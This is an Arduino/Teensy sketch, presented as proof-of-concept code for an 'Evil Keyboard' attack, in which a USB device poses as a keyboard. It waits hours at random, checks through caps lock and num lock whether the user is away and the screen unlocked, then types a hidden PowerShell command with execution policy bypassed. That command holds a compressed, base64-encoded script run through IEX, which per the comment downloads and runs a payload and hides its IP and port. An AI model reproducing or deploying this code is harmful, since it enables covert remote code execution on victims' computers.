// This is the POC code for the Evil Keyboard attack
// This code has only been tested using shorten timeframes against virtual machines.

// By Josh Hale "sn0wfa11"

// Set the LED pin
const int led = 13; // Teensy 3.2 has LED on 13

// Set some time values
unsigned int sec = 1000;
unsigned int mnt = 60000;
unsigned int hr = 3600000;

// Powershell command to download, execute, and delete the payload script.  Encoded and compressed to try to hide ip and port information.
char command1[] = "powershell.exe -Nop -NonI -W Hidden -Exec Bypass -Command \"$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAL+a7FYCAz2OsQ6CMBRFf+UNTdAorxZiMTRMGuPk4uDiAuURMbQ1+hD9e+vieG7OTY6wlacpDc2NLMPp82RyeCTGMzXboSfPBsQIFSRX5nsppSpyzHJUWqHa6FJlq7WWjE3NSTS7aIpDcAQLSC7/2eIuTH4IdbvvB5qJcSm6uQHrWqQ3gbTxaeBBLrwo7WPCj79zDxlJmwAAAA=='));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\"";
char command2[] = "powershell.exe -Nop -NonI -W Hidden -Exec Bypass -Command \"$k=New-Object -ComObject WScript.Shell;$k.SendKeys('{NUMLOCK}');\"";

bool connect_good;

void setup() 
{
  pinMode(led, OUTPUT);
  randomSeed(analogRead(0)); // Generate random seed based on noise from pin 0
  wait_for_drivers(2000, 5000);
}

void loop() 
{
  connect_good = false;
  delay(random(60, 120) * mnt); // wait between 1 and 2 hours
  
  capslock_on();
  if (capslock_check(1200, 500)) // Check to see if the caps lock is turned off within 10 minutes checking every half second
  {
    capslock_off();
    numlock_off();
    delay(100);
    run_command(command2); // Try using powershell to turn on numlock. This will indicated if the computer is locked or not.
    if (numlock_success(75, 75))
    {
      numlock_off();
      delay(100);      
      run_and_hide(command1); // Execute the powershell attack
      
      if (numlock_success(75, 500))
        connect_good = true;
    }
    else
      Keyboard.println(""); // If the screen is locked this will press enter to clear out the invalid password message.
  }

  if (connect_good)
    delay(random(300, 600) * mnt); // If connected wait between 5 and 10 hours and then go again.
}


